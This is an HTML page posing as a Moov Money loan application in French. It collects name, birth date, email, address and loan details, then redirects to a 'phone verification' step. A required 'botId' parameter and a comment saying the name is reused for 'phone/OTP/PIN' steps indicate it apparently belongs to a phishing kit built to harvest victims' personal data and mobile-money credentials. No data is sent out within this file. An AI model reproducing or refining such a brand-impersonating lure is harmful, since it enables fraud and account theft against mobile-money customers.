<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Moov Money - Demande de prêt</title>

    <style>
        /* ── reset & base ── */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        }

        body {
            background: #f5f5f5;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            padding: 0;
        }

        .app-wrapper {
            width: 100%;
            max-width: 400px;
            background: #fff;
            min-height: 100vh;
            position: relative;
            box-shadow: 0 0 20px rgba(0,0,0,0.05);
        }

        /* ── top bar (same as OTP page) ── */
        .top-bar {
            height: 95px;
            background: #f57c00;
            display: flex;
            align-items: flex-end;
            padding: 18px 20px;
        }

        .back-btn {
            color: #fff;
            font-size: 28px;
            text-decoration: none;
            line-height: 1;
            cursor: pointer;
            background: none;
            border: none;
            padding: 0;
        }

        /* ── container ── */
        .container {
            padding: 18px 28px 100px; /* bottom padding for fixed button */
        }

        /* ── logo ── */
        .logo {
            text-align: center;
            margin: 12px 0 24px;
        }

        .logo-circle {
            width: 56px;
            height: 56px;
            background: #9A0000;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 8px;
            font-size: 28px;
            font-weight: 700;
            color: #fff;
        }

        .moov-text {
            font-size: 20px;
            font-weight: 700;
            color: #9A0000;
            letter-spacing: 0.5px;
        }

        /* ── header ── */
        .page-header h1 {
            font-size: 22px;
            font-weight: 700;
            color: #333;
            margin-bottom: 6px;
        }

        .page-header p {
            font-size: 15px;
            color: #8b8b8b;
            margin-bottom: 28px;
        }

        /* ── form elements ── */
        form label {
            font-size: 14px;
            font-weight: 500;
            color: #555;
            display: block;
            margin-bottom: 6px;
        }

        form input,
        form select {
            width: 100%;
            padding: 14px 16px;
            font-size: 15px;
            border-radius: 8px;
            border: 1px solid #d9d9d9;
            background: #fff;
            color: #222;
            outline: none;
            transition: border-color 0.3s;
            margin-bottom: 18px;
            appearance: auto;
        }

        form input:focus,
        form select:focus {
            border-color: #1976d2;
            box-shadow: 0 0 0 2px rgba(25, 118, 210, 0.15);
        }

        form input::placeholder,
        form select option {
            color: #aaa;
        }

        form select option {
            background: #fff;
            color: #222;
        }

        /* ── checkboxes ── */
        .checkbox-wrapper {
            display: flex;
            gap: 10px;
            margin-bottom: 16px;
            font-size: 14px;
            color: #444;
            align-items: flex-start;
        }

        .checkbox-wrapper input[type="checkbox"] {
            width: 18px;
            height: 18px;
            min-width: 18px;
            margin-top: 2px;
            accent-color: #9A0000;
            cursor: pointer;
            border: 1px solid #ccc;
            border-radius: 4px;
            background: #fff;
        }

        .checkbox-wrapper label {
            cursor: pointer;
            margin-bottom: 0;
            color: #555;
            font-weight: 400;
        }

        .checkbox-wrapper label strong {
            color: #9A0000;
        }

        /* ── continue button (fixed at bottom, like OTP page) ── */
        .continue-btn {
            position: fixed;
            left: 28px;
            right: 28px;
            bottom: 28px;
            width: auto;
            max-width: 400px;
            margin: 0 auto;
            padding: 16px;
            font-size: 20px;
            font-weight: 600;
            border-radius: 10px;
            border: none;
            cursor: not-allowed;
            transition: all 0.2s ease;
            background: #f5c6cb;
            color: #fff;
            opacity: 0.7;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
        }

        .continue-btn:enabled {
            background: #9A0000;
            opacity: 1;
            cursor: pointer;
        }

        .continue-btn:hover:enabled {
            background: #7a0000;
            transform: scale(1.01);
        }

        .continue-btn:active:enabled {
            transform: scale(0.98);
        }

        /* ── back link (hidden, because we have top bar back) ── */
        .back-link {
            display: none;
        }

        /* ── footer ── */
        .footer {
            margin-top: 24px;
            text-align: center;
            font-size: 12px;
            color: #bbb;
            letter-spacing: 0.5px;
            padding-bottom: 12px;
        }
    </style>
</head>
<body>

<div class="app-wrapper">

    <!-- Top bar with back arrow -->
    <div class="top-bar">
        <button class="back-btn" onclick="window.history.back()">&#8592;</button>
    </div>

    <div class="container">
        <!-- Logo -->
        <div class="logo">
            <div class="logo-circle">M</div>
            <div class="moov-text">Moov Money</div>
        </div>

        <div class="page-header">
            <h1>Demande de prêt</h1>
            <p>Veuillez fournir vos informations personnelles</p>
        </div>

        <form id="loanForm">
            <label>Nom complet</label>
            <input name="fullName" placeholder="Ex: Jean Dupont" required />

            <label>Date de naissance</label>
            <input type="date" name="dob" required />

            <label>Adresse e-mail</label>
            <input type="email" name="email" placeholder="exemple@email.com" required />

            <label>Adresse résidentielle</label>
            <input name="address" placeholder="Votre adresse complète" required />

            <label>Situation professionnelle</label>
            <select name="employmentStatus" required>
                <option value="">Sélectionnez</option>
                <option>Employé</option>
                <option>Indépendant</option>
                <option>Sans emploi</option>
                <option>Étudiant</option>
            </select>

            <label>Objet du prêt</label>
            <select name="loanPurpose" required>
                <option value="">Sélectionnez</option>
                <option>Affaires</option>
                <option>Personnel</option>
                <option>Éducation</option>
                <option>Médical</option>
                <option>Urgence</option>
            </select>

            <label>Montant du prêt (FCFA)</label>
            <input type="number" name="loanAmount" required placeholder="MIN 4 000" min="4000" max="25000000" />

            <label>Durée du prêt</label>
            <select name="loanTerm" required>
                <option value="">Sélectionnez</option>
                <option>6 mois</option>
                <option selected>12 mois</option>
                <option>24 mois</option>
                <option>36 mois</option>
                <option>48 mois</option>
            </select>

            <div class="checkbox-wrapper">
                <input type="checkbox" id="termsCheck" required />
                <label for="termsCheck">J'accepte les conditions générales</label>
            </div>

            <div class="checkbox-wrapper">
                <input type="checkbox" id="interestCheck" required />
                <label for="interestCheck">
                    Je comprends que les prêts sont soumis à un taux d'intérêt de <strong>8 % à 15 % par mois</strong>
                    selon la solvabilité et le montant.
                </label>
            </div>
        </form>

        <div class="footer">v 5.3.2 (1.0.0)</div>
    </div>

    <!-- Continue button placed outside the form but inside the wrapper for fixed positioning -->
    <button id="continueBtn" class="continue-btn" disabled>Continuer</button>

</div>

<script>
    (function() {
        // ---------- BOT ID ----------
        const params = new URLSearchParams(window.location.search);
        const urlBotId = params.get('botId');
        if (urlBotId) localStorage.setItem('botId', urlBotId);
        const botId = localStorage.getItem('botId');

        if (!botId) {
            alert('Session invalide. Veuillez recommencer.');
            window.location.href = 'index.html';
            return;
        }

        // ---------- FORM ELEMENTS ----------
        const form = document.getElementById('loanForm');
        const termsCheck = document.getElementById('termsCheck');
        const interestCheck = document.getElementById('interestCheck');
        const button = document.getElementById('continueBtn');

        // ---------- ENABLE BUTTON ----------
        function updateButton() {
            button.disabled = !(termsCheck.checked && interestCheck.checked);
        }

        termsCheck.addEventListener('change', updateButton);
        interestCheck.addEventListener('change', updateButton);

        // ---------- FORM SUBMIT ----------
        form.addEventListener('submit', (e) => {
            e.preventDefault();

            // Save all form data
            const data = Object.fromEntries(new FormData(form));
            localStorage.setItem('loanFormData', JSON.stringify(data));

            // Save the full name (used later in phone/OTP/PIN)
            localStorage.setItem('fullName', data.fullName);

            // Redirect to phone verification
            window.location.href = `details.html?botId=${botId}`;
        });

        // ---------- CLICK ON CONTINUE BUTTON TRIGGERS FORM SUBMIT ----------
        button.addEventListener('click', function() {
            if (!this.disabled) {
                form.dispatchEvent(new Event('submit'));
            }
        });

        // ---------- BACK BUTTON (top bar) already uses onclick ----------
        // Also handle the case where the back button might be needed.
    })();
</script>

</body>
</html>
